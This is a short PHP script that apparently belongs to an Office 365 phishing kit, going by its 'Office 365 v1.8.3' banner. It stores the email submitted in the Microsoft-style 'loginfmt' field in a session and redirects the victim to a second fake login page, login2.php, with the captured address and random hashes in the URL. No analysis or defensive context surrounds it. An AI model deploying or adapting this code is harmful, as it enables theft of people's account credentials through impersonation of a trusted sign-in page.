<?php
/*
***********************************************************
*                                                         *
*             Office 365 v1.8.3                           *
*                     For More : Office 365 v1.8.3        *
*                                [+] Office 365 v1.8.3    *
*                                                         *
*             Office 365 v1.8.3                           *
*                                                         *
***********************************************************
*/
session_start();
$_SESSION['_L'] =$_POST['loginfmt'];
       HEADER("Location: ./login2.php?=".$_SESSION['_L']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>